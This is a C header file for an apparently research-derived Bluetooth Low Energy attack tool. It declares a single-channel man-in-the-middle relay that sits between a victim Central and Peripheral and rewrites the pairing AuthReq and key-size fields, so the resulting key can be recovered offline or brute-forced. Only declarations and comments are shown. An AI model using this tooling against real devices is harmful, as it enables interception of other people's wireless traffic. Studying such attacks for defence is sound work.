// ========================================
//  nom du fichier: blerp_mitm_relay.h
//  description courte: BLERP single-channel MitM relay (NDSS 2026, Fig. 6).
//  Unlike blerp_run_mitm()'s double-channel attack (two independent
//  pairings with the attacker), this relays SMP PDUs between the real
//  victim Central and the real victim Peripheral, tampering only with the
//  Pairing Request/Response feature-negotiation fields before forwarding
//  them.
//  dernière modification : 2026-10-10
//  auteur: GitHub/@gGaToRr
// ========================================

#ifndef BLEURP_BLERP_MITM_RELAY_H
#define BLEURP_BLERP_MITM_RELAY_H

#include <stdbool.h>
#include <stdint.h>

#include "blerp_attack.h"

// Outcome of a single-channel relay session. Charlie never derives a key of
// his own here: Alice (the victim Central) and Bob (the victim Peripheral)
// derive a shared key with EACH OTHER, at whatever security level Charlie
// let through -- weak enough (e.g. Legacy Just Works, TK=0) that it can be
// recovered offline from the relayed Confirm/Random values, or brute-forced
// within the downgraded key size (KNOB). Field names follow Fig. 6 of the
// paper: Alice is the Central Charlie impersonates Bob to; Bob is the
// Peripheral Charlie impersonates Alice to.
struct blerp_relay_report {
    bool linked_alice;      // victim Central connected to us (as fake Bob)
    bool linked_bob;        // we connected to the victim Peripheral (as fake Alice)
    bool enc_rejected;      // V5: rejected Alice's initial LTK request
    bool preq_relayed;      // forwarded a (possibly rewritten) Pairing Request
    bool pres_relayed;      // forwarded a (possibly rewritten) Pairing Response
    uint8_t alice_authreq;  // AuthReq Alice originally offered in the Pairing Request
    uint8_t bob_authreq;    // AuthReq actually forwarded to Bob
    uint8_t alice_keysize;  // max key size Alice originally offered
    uint8_t bob_keysize;    // max key size actually forwarded to Bob
    bool pairing_completed; // Pairing Random was relayed in both directions
    bool pairing_failed;    // either side sent Pairing Failed (relayed to the other)
    uint8_t fail_reason;
};

// True for the two SMP opcodes this relay tampers with before forwarding
// (Pairing Request, Pairing Response); false for every opcode relayed
// byte-for-byte (public key, confirm, random, Phase 3 key distribution,
// pairing failed, ...). Pure decision: documents and tests the relay's
// tamper policy independent of any socket I/O.
bool blerp_relay_should_rewrite(uint8_t smp_opcode);

// Run the single-channel MitM relay.
//   cfg->dev_id      primary adapter: advertises as the victim Peripheral
//                    (cfg->target_addr) to attract the victim Central.
//   cfg->dev_id_sec  secondary adapter: connects to the real victim
//                    Peripheral (cfg->target_addr) as the victim Central
//                    (cfg->spoof_addr).
//   cfg->downgraded_authreq / downgraded_keysize: the parameters forced
//                    into every relayed Pairing Request/Response (see
//                    blerp_rewrite_preq/blerp_rewrite_pres).
// Both target_addr and two distinct adapters are required, exactly like
// blerp_run_mitm(). Returns 0 once the session ends for any reason (a link
// dropped, pairing finished or failed, or cfg->wait_conn_ms/wait_react_ms
// elapsed) with `rep` describing what happened, or -1 if a precondition
// failed or an adapter could not be used (errno set, nothing printed to
// stderr beyond what hci_user_channel_strerror's caller already handles).
int blerp_run_single_channel_mitm(const struct blerp_attack_config *cfg,
                                  struct blerp_relay_report *rep);

#endif // BLEURP_BLERP_MITM_RELAY_H
